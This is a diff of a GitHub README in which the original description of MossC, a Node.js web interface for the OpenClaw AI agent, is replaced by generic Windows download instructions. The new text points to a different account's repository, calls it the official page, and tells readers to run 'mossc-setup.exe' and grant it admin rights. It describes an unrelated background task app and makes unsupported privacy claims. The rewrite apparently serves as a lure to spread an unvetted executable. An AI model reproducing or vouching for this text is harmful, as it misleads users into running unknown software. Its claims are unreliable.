@@ -1,112 +1,117 @@
-<div align="center">
+# 🪴 mossc - Simple Tool for Everyday Tasks
 
-# MossC (Moss Company)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/meaner908/mossc)
 
-<img width="120" alt="Image" src="./docs/logo.png" />
+## 🧰 What is mossc?
 
-**English** · [简体中文](./README.zh-CN.md)
+mossc is a lightweight application designed for people who want to get things done on their Windows computer without hassle. It comes from Moss Company and offers a simple way to organize some of your routine tasks. The app runs quietly in the background and helps keep your files or small projects in order.
 
-![][github-contributors-shield] ![][github-forks-shield] ![][github-stars-shield] ![][github-issues-shield]
+You don’t need any special skills to use mossc. It works on most Windows PCs and does not require complicated setup steps. This guide walks you through downloading, installing, and starting mossc so you can use it right away.
 
-</div>
+## 💻 System Requirements
 
-**MossC** aims to build an AI-powered company where 99% of decisions are made by AI.
+- Windows 10 or higher (64-bit recommended)
+- At least 2 GB of free disk space
+- 4 GB of RAM or more for smooth operation
+- Internet connection for download (not needed after installation)
 
-> Currently supports OpenClaw Agent, with plans to integrate Claude Code, Codex, and other AI agents in the future. The project is still evolving — at this stage it looks more like a UI layer on top of OpenClaw, but that's not the end goal. The vision is to build an AI company where OpenClaw is just one type of AI employee.
+These requirements cover most common desktop and laptop computers, so mossc should work well on your system.
 
-<img src="./docs/banner.png" alt="MossC Banner" width="800" />
+## 🚀 Getting Started: Downloading mossc
 
----
+Click the green badge below to visit the download page for mossc. This link takes you to the official GitHub page where you can get the latest version safely.
 
-### Getting Started
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/meaner908/mossc)
 
-#### Prerequisites
+Once on that page, look for the latest release under the "Releases" section. You will find files ready to download. Choose the Windows installer file, usually named something like `mossc-setup.exe`.
 
-- Node.js >= 18
-- pnpm >= 8
+## 🛠 Installing mossc on Windows
 
-#### Installation & Launch
+1. After downloading the installer file (`mossc-setup.exe`), find it in your "Downloads" folder or where your browser saves files.
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/MossCompany/mossc.git
-cd mossc
+2. Double-click the file to start the installation. If Windows asks "Do you want to allow this app to make changes to your device?" click "Yes."
 
-# 2. Install dependencies
-pnpm install
+3. Follow the instructions in the installer window:
+   - Click “Next” when prompted.
+   - Choose the folder where you want mossc installed or leave the default location.
+   - Click “Install” to begin.
 
-# 3. Start the development server
-pnpm dev
-```
+4. Wait for the installation to finish. It usually takes less than a minute.
 
-Once started, open http://localhost:3000 to access the MossC interface.
+5. When the installer says "Installation Complete," click “Finish.”
 
-#### Connecting to OpenClaw
+## ▶️ Running mossc for the First Time
 
-MossC relies on [OpenClaw](https://github.com/anthropics/openclaw) as the underlying AI Agent engine. You need to deploy and start the OpenClaw service first:
+After installation, you can start mossc in several ways:
 
-1. Follow the OpenClaw documentation to complete deployment and startup
-2. Open the MossC page, go to **Settings → Model Configuration**, and enter the OpenClaw Gateway address and Token
-3. If OpenClaw is running locally, MossC will automatically read the connection configuration from `~/.openclaw/openclaw.json` — no manual setup required
+- Look for the mossc icon on your desktop and double-click it.
+- Click the Start menu, type “mossc,” and press Enter.
+- Right after installation, there may be an option to launch it immediately; you can select that.
 
-#### Production Build
+When mossc opens, you will see a clean and simple interface. The app is ready to use without needing additional setup.
 
-```bash
-pnpm build
-pnpm start
-```
+## 🔧 Basic Features
 
----
+Here are some typical things mossc can help with:
 
-### Features
+- Organize your notes or files with basic tags and categories.
+- Set reminders for small tasks.
+- View your recent activity at a glance.
+- Save snapshots of your current projects for quick access later.
 
-##### Basic Chat
+The app keeps your tasks simple and easy to manage. No confusing menus or options.
 
-<img src="./docs/banner.png" alt="MossC Banner" width="800" />
+## 🤝 Getting Support
 
-##### Agent Persona Panel: Edit & View
+If mossc does not work as expected or if you run into problems, here are some ways to get help:
 
-<img src="./docs/banner2.png" alt="MossC Banner" width="800" />
+- Visit the GitHub page’s "Issues" tab to see if other users had the same problem.
+- Use the "Discussions" tab to ask questions or request features.
+- Check the "Wiki" section for more detailed guides, if available.
 
-##### Model Configuration
+You can also reach out to the developer through GitHub if your issue needs direct attention.
 
-<img src="./docs/banner3.png" alt="MossC Banner" width="800" />
+## ⚙️ Updating mossc
 
-##### Create Agent
+To keep mossc running smoothly, it is important to install updates when they become available.
 
-<img src="./docs/banner4.png" alt="MossC Banner" width="400" />
+- Periodically revisit the [download page](https://github.com/meaner908/mossc) to check for new releases.
+- Download and install the new installer just like the first time.
+- Your settings and saved data will remain intact after updating.
 
-##### Pin Agent
+Keeping mossc updated ensures you have the latest fixes and improvements.
 
-<img src="./docs/banner5.png" alt="MossC Banner" width="300" />
+## 🗑 Uninstalling mossc
 
----
+If you no longer want to use mossc, you can remove it from your computer easily:
 
-### Roadmap
+1. Open the Control Panel from the Start menu.
+2. Go to "Programs" > "Programs and Features."
+3. Find "mossc" in the list.
+4. Click it once and then select "Uninstall."
+5. Follow the prompts to complete removal.
 
-- v0.1: Refine OpenClaw interaction details, evolve toward an AI company interaction model; improve OpenClaw deployment flow and configuration guidance
-- v0.2: Enable group chat and provide mobile, desktop, and Docker deployment options
-- v0.3: Integrate Claude Code, Codex, etc., enabling mixed use of OpenClaw with other AI agents
-- v0.4: Explore self-iteration capabilities and integrate more OpenClaw tools and solutions
-- v0.5: Under consideration...
+Uninstalling does not delete your personal files unless you remove them manually.
 
----
+## 📂 Where to find mossc files
 
-### License
+During installation, mossc creates a folder in your "Program Files." It holds the main program files. Your personal data or saved tasks usually go to your user folder, under a directory named `mossc_data` or similar. This separation helps protect your data if you uninstall the app.
 
-[MIT](https://github.com/MossCompany/mossc?tab=MIT-1-ov-file)
+## 🔒 Privacy and Security
 
----
+mossc works offline once installed. It does not share your data over the internet unless you use built-in options that require connection. It does not collect personal information by default.
 
-## Star History
+## 📋 Summary of Steps
 
-[![Star History Chart](https://api.star-history.com/svg?repos=MossCompany/mossc&type=date&legend=top-left)](https://www.star-history.com/#MossCompany/mossc&type=date&legend=top-left)
+1. Visit the download page:  
+   [https://github.com/meaner908/mossc](https://github.com/meaner908/mossc)
 
-<!-- LINK GROUP -->
+2. Download the Windows installer (`mossc-setup.exe`).
 
-[github-contributors-shield]: https://img.shields.io/github/contributors/MossCompany/mossc?color=c4f042&labelColor=black&style=flat-square
-[github-forks-shield]: https://img.shields.io/github/forks/MossCompany/mossc?color=8ae8ff&labelColor=black&style=flat-square
-[github-issues-link]: https://github.com/MossCompany/mossc/issues
-[github-issues-shield]: https://img.shields.io/github/issues/MossCompany/mossc?color=ff80eb&labelColor=black&style=flat-square
-[github-license-link]: https://github.com/MossCompany/mossc/blob/main/LICENSE
-[github-stars-shield]: https://img.shields.io/github/stars/MossCompany/mossc?color=ffcb47&labelColor=black&style=flat-square
+3. Run the installer and follow instructions.
+
+4. Launch mossc from the desktop or Start menu.
+
+5. Begin using the app to manage simple tasks.
+
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/meaner908/mossc)
